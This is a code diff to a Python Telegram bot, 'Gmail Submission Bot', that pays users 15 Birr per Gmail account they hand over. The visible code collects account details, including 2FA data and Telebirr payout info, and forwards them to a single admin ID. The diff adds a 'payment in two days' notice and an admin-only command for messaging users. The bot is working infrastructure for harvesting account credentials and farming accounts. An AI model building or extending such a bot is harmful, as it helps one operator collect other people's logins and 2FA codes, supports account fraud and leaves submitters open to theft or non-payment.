@@ -11,6 +11,8 @@ from telegram.ext import (
     filters,
 )
 
+ADMIN_ID = 2103337926  # Your Admin ID
+
 # --- MINI WEB SERVER TO KEEP RENDER AWAKE ---
 class SimpleHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -38,12 +40,38 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
     
     welcome_text = (
+        "⏳ **Payment is in two days**\n\n"
         "👋 **Welcome to Gmail Submission Bot!**\n\n"
         "✨ **Payout Rate:** **15 Birr** per approved account.\n\n"
         "Click the button below to submit your account details:"
     )
     
     await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=markup)
+
+# Admin Direct Message Command
+async def send_user_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return  # Only allow the admin to use this command
+
+    if len(context.args) < 2:
+        await update.message.reply_text(
+            "⚠️ **Usage:** `/send <user_id> <message>`",
+            parse_mode="Markdown"
+        )
+        return
+
+    target_user_id = context.args[0]
+    message_text = " ".join(context.args[1:])
+
+    try:
+        await context.bot.send_message(
+            chat_id=target_user_id,
+            text=f"💬 **Message from Admin:**\n\n{message_text}",
+            parse_mode="Markdown"
+        )
+        await update.message.reply_text(f"✅ Message sent to user `{target_user_id}`.", parse_mode="Markdown")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send message: {e}")
 
 # Step 1: Start submission process
 async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -124,7 +152,6 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     two_fa = context.user_data.get('2fa', 'N/A')
     
     user = update.effective_user
-    my_admin_id = 2103337926  # Your Admin ID
     
     admin_message = (
         f"🚨 **NEW ACCOUNT SUBMISSION** 🚨\n\n"
@@ -138,7 +165,7 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"💰 **Telebirr:** {telebirr_info}"
     )
     
-    await context.bot.send_message(chat_id=my_admin_id, text=admin_message, parse_mode="Markdown")
+    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message, parse_mode="Markdown")
     context.user_data.clear()
 
     reply_keyboard = [
@@ -192,6 +219,7 @@ if __name__ == '__main__':
     )
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("send", send_user_message))
     app.add_handler(conv_handler)
     app.add_handler(MessageHandler(filters.Regex("^💬 Help$"), help_handler))
     app.add_handler(MessageHandler(filters.Regex("^🤖 My Bot$"), my_bot_handler))
